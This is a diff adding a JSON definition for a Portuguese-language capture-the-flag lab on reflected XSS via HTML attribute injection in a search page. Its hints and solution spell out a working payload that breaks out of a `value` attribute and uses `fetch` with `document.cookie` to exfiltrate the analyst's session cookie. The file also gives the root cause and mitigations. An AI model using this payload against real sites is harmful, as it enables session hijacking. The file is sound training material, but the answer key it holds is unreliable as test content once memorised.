@@ -1,0 +1,80 @@
+{
+  "slug": "xss-attribute-injection",
+  "title": "Aspas na caixa de busca",
+  "codename": "SCOUTLIGHT",
+  "summary": "Uma página de busca de campo reflete a query dentro de um atributo HTML sem escaping. Fechar o atributo permite que um event handler execute, e o bot do analista abre a URL reportada com um cookie de sessão legível.",
+  "category": "xss",
+  "difficulty": "easy",
+  "lab_dir": "xss-attribute-injection",
+  "estimated_minutes": 15,
+  "xp": 110,
+  "tech": [
+    "Flask",
+    "HTML",
+    "JavaScript"
+  ],
+  "tags": [
+    "xss",
+    "attribute-injection",
+    "reflected",
+    "bot"
+  ],
+  "story": "O formulário de busca da Scoutlight mantém a última query no input para que os analistas possam refiná-la. O valor é escrito no atributo sem tratamento. Queries reportadas são abertas pelo bot do analista, que mantém seu cookie de sessão legível.",
+  "objective": "Saia do atributo `value` com uma aspa, anexe um handler `autofocus` que exfiltra `document.cookie` para `/collect` e dispare o bot do analista.",
+  "rules": "Permaneça na origem loopback atribuída. Os endpoints do collector e do bot fazem parte do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie do analista",
+      "flag_type": "user",
+      "points": 110,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Olhe para o markup",
+      "body": "Envie qualquer query e inspecione o input. Seu valor é colocado entre `value=\"` e `\"` sem escaping de HTML. Uma aspa dupla literal encerra o atributo.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Você precisa de um evento",
+      "body": "Não é possível abrir uma tag `<script>` dentro de um atributo, mas você pode adicionar atributos. `\" autofocus onfocus=\"...\" x=\"` fecha o valor, adiciona `autofocus` e um handler, e abre um atributo fictício para que o restante continue válido.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "Exfiltre o cookie",
+      "body": "Use `\" autofocus onfocus=\"fetch('/collect?c='+document.cookie)\" x=\"`. O bot visita `/report`, que abre a URL com `analyst_session` definido como a flag. Leia `/captured`.",
+      "cost": 20
+    }
+  ],
+  "solution": {
+    "walkthrough": "Solicite `/search?q=\" autofocus onfocus=\"fetch('/collect?c='+document.cookie)\" x=\"` (com as aspas codificadas para URL). O input fica assim:\n\n```html\n<input name=\"q\" value=\"\" autofocus onfocus=\"fetch('/collect?c='+document.cookie)\" x=\"\" ...>\n```\n\nO elemento recebe foco e o handler executa. Envie o bot do analista via `POST /report`; ele abre a URL fixa de revisão com `analyst_session=<flag>`. O script envia o cookie para `/collect`, e `/captured` o mostra.",
+    "root_cause": "A entrada do usuário é concatenada em um atributo HTML sem escaping sensível ao contexto. O contexto de atributo exige a codificação de aspas e a rejeição de `<`, `>` e aspas isoladas; usar um template engine com autoescaping para atributos evita o breakout por completo.",
+    "mitigation": "Faça escaping de todo valor dinâmico para seu contexto HTML, incluindo aspas, com um template engine mantido. Evite event handlers inline, implante uma CSP estrita com nonces e marque cookies privilegiados como `HttpOnly` para que scripts não possam lê-los."
+  },
+  "references": [
+    {
+      "title": "OWASP — Cross Site Scripting Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Regras de escaping sensível ao contexto para atributos HTML."
+    },
+    {
+      "title": "CWE-79 — Improper Neutralization of Input During Web Page Generation",
+      "url": "https://cwe.mitre.org/data/definitions/79.html",
+      "source_type": "standard",
+      "description": "Causa raiz do cross-site scripting."
+    },
+    {
+      "title": "PortSwigger — Reflected XSS",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/reflected",
+      "source_type": "official",
+      "description": "Cross-site scripting refletido em parâmetros de request."
+    }
+  ]
+}
